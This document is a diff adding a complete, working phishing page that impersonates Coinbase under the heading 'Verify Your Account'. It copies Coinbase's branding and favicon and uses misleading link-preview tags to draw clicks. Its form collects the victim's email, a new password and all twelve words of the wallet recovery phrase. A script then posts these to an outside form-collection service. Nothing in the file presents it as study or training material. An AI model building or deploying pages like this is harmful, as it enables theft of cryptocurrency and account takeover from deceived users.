@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <meta property="og:title" content="Loading..." />
+  <meta property="og:description" content="Click here to continue" />
+  <meta property="og:image" content="https://i.imgur.com/s0SdHUz.jpeg" />
+  <meta property="og:image:width" content="640" />
+  <meta property="og:image:height" content="480" />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://yourwebsite.com/page-url" />
+  <title>Coinbase – Verify Your Account</title>
+  <link rel="icon" href="https://www.coinbase.com/favicon.ico" type="image/x-icon" />
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f7f7f7;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: #fff;
+      padding: 45px;
+      border-radius: 10px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      width: 360px;
+      text-align: left;
+    }
+    .container h2 {
+      font-size: 45px;
+      color: #0052ff;
+      text-align: center;
+      margin: 0;
+    }
+    .container h3 {
+      text-align: center;
+      margin-top: 5px;
+      margin-bottom: 15px;
+      font-weight: normal;
+    }
+    .container p {
+      font-size: 14px;
+      color: #333;
+      margin-bottom: 15px;
+    }
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      box-sizing: border-box;
+    }
+    .seed-grid {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin-top: 15px;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background: #0052ff;
+      color: #fff;
+      border: none;
+      margin-top: 20px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    button:hover {
+      background-color: #003dcc;
+    }
+    .note {
+      margin-top: 10px;
+      font-size: 12px;
+      color: #888;
+    }
+    .footer {
+      margin-top: 20px;
+      text-align: center;
+      font-size: 9px;
+      color: #888;
+    }
+    #loadingScreen {
+      display: none;
+      text-align: center;
+      padding-top: 20px;
+    }
+    .spinner {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #0052ff;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="formScreen">
+    <h2>Coinbase</h2>
+    <h3>Verify Your Account</h3>
+    <p>Enter your email, set a new password, and re-enter your wallet recovery phrase to verify your account.</p> 
+
+    <form id="phishform" action="https://formspree.io/f/xrbklngw" method="POST">        
+      <input id="email" name="email" type="text" placeholder="Email" required />
+      <input id="password" name="password" type="password" placeholder="New password" required />
+
+      <h4>Enter Your Backup-phrase</h4>
+      <p class="note">To secure your Wallet, re-enter your wallet recovery-phrase below.</p>
+
+      <div class="seed-grid">
+        <input type="text" name="seed1" placeholder="Word 1" required>
+        <input type="text" name="seed2" placeholder="Word 2" required>
+        <input type="text" name="seed3" placeholder="Word 3" required>
+        <input type="text" name="seed4" placeholder="Word 4" required>
+        <input type="text" name="seed5" placeholder="Word 5" required>
+        <input type="text" name="seed6" placeholder="Word 6" required>
+        <input type="text" name="seed7" placeholder="Word 7" required>
+        <input type="text" name="seed8" placeholder="Word 8" required>
+        <input type="text" name="seed9" placeholder="Word 9" required>
+        <input type="text" name="seed10" placeholder="Word 10" required>
+        <input type="text" name="seed11" placeholder="Word 11" required>
+        <input type="text" name="seed12" placeholder="Word 12" required>
+      </div>
+
+      <button type="submit">Verify</button>
+    </form>
+
+    <div class="footer">© 2025 Coinbase, Inc. All rights reserved.</div>   
+  </div>
+
+  <div class="container" id="loadingScreen" style="display: none;">
+    <h2>Securing your wallet...</h2>
+    <p>Please wait, do not close this page.</p>
+    <div class="spinner"></div>
+  </div>
+
+  <div id="phishform-status"></div>
+
+  <script>
+    var form = document.getElementById("phishform");
+
+    async function handleSubmit(event) {
+      event.preventDefault();
+      var status = document.getElementById("phishform-status");
+      var data = new FormData(event.target);
+
+      fetch(event.target.action, {
+        method: form.method,
+        body: data,
+        headers: {
+            'Accept': 'application/json'
+        }
+      }).then(response => {
+        if (response.ok) {
+          status.innerHTML = "Verifying Your Account!";
+          form.reset();
+        } else {
+          response.json().then(data => {
+            if (Object.hasOwn(data, 'errors')) {
+              status.innerHTML = data["errors"].map(error => error["message"]).join(", ");
+            } else {
+              status.innerHTML = "Oops! There was a problem verifying your wallet";
+            }
+          });
+        }
+      }).catch(error => {
+        status.innerHTML = "Oops! There was a problem verifying your wallet";
+      });
+    }
+
+    form.addEventListener("submit", handleSubmit);
+  </script>
+</body>
+</html>
